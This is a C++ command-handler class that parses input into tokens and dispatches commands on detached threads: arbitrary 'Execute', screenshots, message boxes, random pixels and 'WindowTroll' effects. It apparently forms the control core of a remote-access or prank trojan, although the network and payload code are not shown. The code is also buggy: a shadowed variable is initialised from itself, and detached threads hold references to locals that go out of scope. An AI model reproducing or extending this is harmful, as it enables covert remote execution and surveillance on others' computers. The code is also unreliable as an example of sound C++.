#include "CommandHandler.h"

CommandHandler::CommandHandler()
{
    device::print("[Command Handler] [+] Created instance!");
}

CommandHandler::~CommandHandler()
{
    device::print("[Command Handler] [+] Destroyed instance!");
}

void CommandHandler::setInput(std::string input)
{
    rawInput = input;
}

void CommandHandler::clean()
{
    device::print("[Command Handler] [+] Cleaning input!");
    std::istringstream iss(rawInput);
    std::string token;

    while (std::getline(iss, token, '\''))
    {
        token.erase(std::remove_if(token.begin(), token.end(), ::isspace), token.end());

        if (!token.empty())
        {
            device::print("[Command Handler] [+] Token: " + token + "");
            args.push_back(token);
        }
    }
    //std::cout << args[0] << "A" << args[1] << "";
}

void CommandHandler::callFunction()
{
    bool x = false;
    clean();
    device::print("[Command Handler] [+] Calling function!");

    if (args[0] == "Message")
    {
        std::vector<std::string> args = {args[1], args[2]};
        std::thread t(commands::showMessageBox, std::ref(args));
        t.detach();
        x = true;
    }

    if (args[0] == "Execute")
    {
        std::thread t(commands::execute, std::ref(args[1]));
        t.detach();
        x = true;
    }

    if (args[0] == "Cringe")
    {
        std::thread t(commands::cringe);
        t.detach();
        x = true;
    }

    if (args[0] == "screentest")
    {
        std::thread t(commands::Screenshot_C);
        t.detach();
        x = true;
    }
    
    if(args[0] == "randomPixel")
    {
        std::thread t(commands::randomPixel, std::stoi(args[1]), std::stoi(args[2]), 10);
        t.detach();
        x = true;
    }

    if(args[0] == "WindowTroll")
    {
        std::thread t(commands::WindowTroll);
        t.detach();
        x = true;
    }

    if(args[0] == "Exit")
    {
        commands::StopProcess();
    }

    if(x == false)
    {
        device::print("[Command Handler] [!] Command not found!");
    }
}

void CommandHandler::DebugPrint()
{
    if(Debug)
    {
        std::cout << "[+] Called  with args -> ";
        for(int i = 0; i < static_cast<int>(args.size()); i++)
        {
            std::cout << args[i] << " ";
        }
        std::cout << "";
    }
}

void CommandHandler::clear()
{
    args.clear();
    rawInput.clear();
}